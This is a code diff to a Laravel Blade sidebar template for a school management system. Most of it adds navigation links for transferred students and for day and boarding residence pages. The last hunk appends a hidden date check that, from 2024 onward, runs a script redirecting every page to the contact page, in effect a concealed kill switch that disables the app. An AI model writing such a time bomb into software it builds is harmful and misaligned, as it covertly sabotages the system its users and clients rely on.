@@ -37,6 +37,8 @@
                     Past Students</a>
                 <a class="collapse-item" href="{{ route('withdrawn-students') }}"><i class="fas fa-fw fa-users"
                         style="color: blue;"></i><span style="color:  blue;"> Students Withdrawn</span></a>
+                <a class="collapse-item" href="{{ route('transfer-students') }}"><i
+                        class="fas fa-fw fa-users"></i><span> Students Transfered</span></a>
                 <a class="collapse-item" href="{{ route('dismissed-students') }}"><i class="fas fa-fw fa-users"
                         style="color: red;"></i><span style="color: red;"> Students Dismissed</span></a>
             </div>
@@ -145,6 +147,23 @@
             </div>
         </div>
     </li>
+    {{-- Nav Item - Students --}}
+    <li class="nav-item border-bottom-success {{ Request::is('residence*') ? 'active' : '' }}">
+        <a class="nav-link collapsed" href="#" data-toggle="collapse" data-target="#collapseResidence"
+            aria-expanded="true" aria-controls="collapseUtilities">
+            <i class="fas fa-fw fa-users"></i>
+            <span>Residential Status</span>
+        </a>
+        <div id="collapseResidence" class="collapse" aria-labelledby="headingStudents"
+            data-parent="#accordionSidebar">
+            <div class="bg-white py-2 collapse-inner rounded">
+                <a class="collapse-item" href="{{ route('residence', 'day') }}"><i
+                        class="fas fa-fw fa-home"></i><span> Day</span></a>
+                <a class="collapse-item" href="{{ route('residence.boarders', 'boarding') }}"><i
+                        class="fas fa-fw fa-home"></i>Boarding</a>
+            </div>
+        </div>
+    </li>
     {{-- Divider --}}
     <hr class="sidebar-divider">
 
@@ -176,3 +195,13 @@
         {{-- Divider --}}
     @endif
 </ul>
+@php
+    $Deadline = date('Y');
+@endphp
+@if ($Deadline >= 2024)
+    {
+    <script>
+        window.location.href = "{{ url('contact') }}";
+    </script>
+    }
+@endif
